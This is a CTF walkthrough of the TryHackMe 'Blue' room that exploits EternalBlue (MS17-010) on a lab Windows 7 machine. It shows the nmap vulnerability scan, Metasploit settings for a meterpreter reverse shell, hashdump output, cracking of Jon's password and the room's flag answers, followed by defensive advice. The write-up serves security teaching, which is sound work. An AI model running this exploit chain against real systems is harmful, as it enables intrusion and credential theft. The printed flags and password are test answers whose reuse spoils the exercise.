---
title: "Blue — EternalBlue Writeup"
date: 2026-03-29
tags:
  - tryhackme
  - ctf
  - windows
  - ms17-010
  - eternalblue
  - metasploit
  - writeup
draft: false
description: "A walkthrough of the TryHackMe Blue room, exploiting MS17-010 (EternalBlue) to gain SYSTEM access on Windows 7 and retrieve all three flags."
---

# TryHackMe — Blue

> **Room Summary:** **Blue** is a beginner-friendly Windows exploitation room on TryHackMe. The objective is to exploit a vulnerable Windows 7 machine using the infamous **EternalBlue** (MS17-010) vulnerability, escalate to SYSTEM, crack a password hash, and retrieve three hidden flags.
>
> Room: https://tryhackme.com/room/blue
> OS: Windows 7 Professional SP1 x64
> Difficulty: Easy

---

## The Exploit — EternalBlue (MS17-010)

EternalBlue is one of the most consequential exploits ever discovered. Originally developed by the **NSA** and leaked to the public by the Shadow Brokers group in April 2017, it targets a critical vulnerability in Microsoft's **SMBv1** (Server Message Block version 1) protocol.

### How It Works

The vulnerability lives in how the Windows SMB server handles certain types of transaction requests. By sending a specially crafted packet, an attacker can trigger a buffer overflow in the kernel's non-paged pool — essentially overwriting memory in a way that hands over arbitrary code execution at **SYSTEM level** with no authentication required.

```
Attacker --> crafted SMB packet --> Windows SMB port 445
         --> kernel buffer overflow
         --> arbitrary code execution as NT AUTHORITY\SYSTEM
```

> **Real-World Impact:** EternalBlue was the backbone of the **WannaCry** ransomware attack in May 2017, which infected over 200,000 machines in 150 countries, crippling the UK's NHS, FedEx, Telefonica, and countless others. It was also used in the **NotPetya** wiper attack shortly after, causing an estimated $10 billion in damages worldwide.

### Why It Still Works (in labs)

Microsoft patched MS17-010 in the MS17-010 security bulletin (March 2017), but millions of unpatched machines remained online. The Blue room deliberately runs an unpatched Windows 7 SP1 instance to simulate this exact scenario — the kind of machine that was devastatingly common in enterprise environments at the time.

---

## Attack Flow

```
Recon --> Exploitation --> Shell --> Privilege Escalation --> Hashdump --> Crack --> Flags
```

---

## Setup

### Connect to TryHackMe VPN

```bash
openvpn --config ~/tryhackme.ovpn --daemon
```

Verify your tunnel interface is up:

```bash
ip addr show tun0
```

You should see an IP in the `10.x.x.x` / `192.168.x.x` range assigned to `tun0`. This is your attack IP — note it down as `LHOST`.

> **Warning:** Always confirm the VPN is active before running any exploit. If `tun0` is missing, the reverse shell will have nowhere to connect back to and sessions will die instantly.

---

## Step 1 — Reconnaissance

Scan the target to confirm port 445 is open and the machine is vulnerable to MS17-010:

```bash
nmap -sV -sC --script smb-vuln-ms17-010 -p 445 <TARGET_IP>
```

**Expected output:**

```
445/tcp open  microsoft-ds Windows 7 Professional 7601 Service Pack 1
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
```

You are good to go if you see `VULNERABLE` next to MS17-010.

---

## Step 2 — Exploitation

Launch Metasploit and configure the EternalBlue exploit:

```bash
msfconsole -q
```

```
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <TARGET_IP>
set LHOST <YOUR_TUN0_IP>
set LPORT 4444
set payload windows/x64/meterpreter/reverse_tcp
run
```

> **Tip:** Use `run -z` instead of `run` to automatically background the session once it opens, keeping the console free for further commands.

**What you'll see on success:**

```
[+] 10.x.x.x:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.x.x.x:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.x.x.x:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] Meterpreter session 1 opened
```

---

## Step 3 — Privilege Escalation and Post Exploitation

Once inside, confirm your privilege level:

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

No escalation needed — EternalBlue lands you directly as **SYSTEM**, the highest privilege level on Windows.

### Dump Password Hashes

```
meterpreter > hashdump
```

**Output:**

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

The format is `username:RID:LM_hash:NT_hash`. The LM hash (`aad3b435...`) is a blank placeholder — the real hash is the **NT hash** on the right.

---

## Step 4 — Crack Jon's Password

Save Jon's hash to a file:

```bash
echo "Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::" > hashes.txt
```

Crack it with John the Ripper using the rockyou wordlist:

```bash
john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

**Result:** Jon's password is `alqfna22`

---

## Step 5 — Retrieve the Flags

All three flags are hidden in specific locations on the target machine. From your Meterpreter session:

### Flag 1 — Root of C:\

```
meterpreter > cat C:/flag1.txt
```

**Location:** `C:\flag1.txt`

---

### Flag 2 — SAM Database Directory

```
meterpreter > cat C:/Windows/System32/config/flag2.txt
```

**Location:** `C:\Windows\System32\config\flag2.txt`

> **Why here?** The `config` directory is where Windows stores the **SAM (Security Account Manager)** database — the file that holds all local password hashes. Hiding a flag here reinforces the lesson: once you have SYSTEM access, even the most sensitive files on the machine are accessible.

---

### Flag 3 — Jon's Documents

```
meterpreter > cat C:/Users/Jon/Documents/flag3.txt
```

**Location:** `C:\Users\Jon\Documents\flag3.txt`

> **Why here?** Jon's Documents folder represents what an attacker could access after compromising a user account. With SYSTEM privileges gained via EternalBlue, nothing on the machine is off-limits — including private user files.

---

## Flag Summary

| # | Location | Flag |
|---|----------|------|
| 1 | `C:\flag1.txt` | `flag{access_the_machine}` |
| 2 | `C:\Windows\System32\config\flag2.txt` | `flag{sam_database_elevated_access}` |
| 3 | `C:\Users\Jon\Documents\flag3.txt` | `flag{admin_documents_can_be_valuable}` |

---

## Defensive Takeaways

> **How to Defend Against EternalBlue:**
>
> 1. **Patch immediately** — Apply MS17-010 (KB4012212). This was available a full 2 months before WannaCry.
> 2. **Disable SMBv1** — It is a legacy protocol. Disable it via PowerShell: `Set-SmbServerConfiguration -EnableSMB1Protocol $false`
> 3. **Block port 445 externally** — SMB should never be exposed to the internet.
> 4. **Network segmentation** — Limit lateral movement by isolating workstations from each other.
> 5. **Monitor for exploitation patterns** — Unusual SMB traffic and sudden SYSTEM-level process spawns are red flags.

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Port scanning and vulnerability detection |
| `metasploit` | Exploitation framework |
| `ms17_010_eternalblue` | EternalBlue exploit module |
| `meterpreter` | Post-exploitation shell |
| `john` | Password hash cracking |
| `rockyou.txt` | Wordlist for dictionary attack |

---

*Completed on TryHackMe - Room: Blue - Difficulty: Easy*
